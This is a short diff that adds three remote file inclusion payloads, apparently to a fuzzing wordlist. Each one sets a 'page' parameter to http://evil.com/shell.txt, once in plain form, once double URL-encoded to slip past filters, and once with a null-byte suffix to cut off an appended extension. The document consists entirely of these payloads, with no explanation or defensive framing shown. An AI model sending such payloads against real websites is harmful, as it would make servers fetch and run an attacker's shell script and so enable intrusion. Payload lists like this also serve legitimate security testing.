@@ -1,0 +1,3 @@
+?page=http:%252f%252fevil.com%252fshell.txt
+?page=http://evil.com/shell.txt
+?page=http://evil.com/shell.txt%00
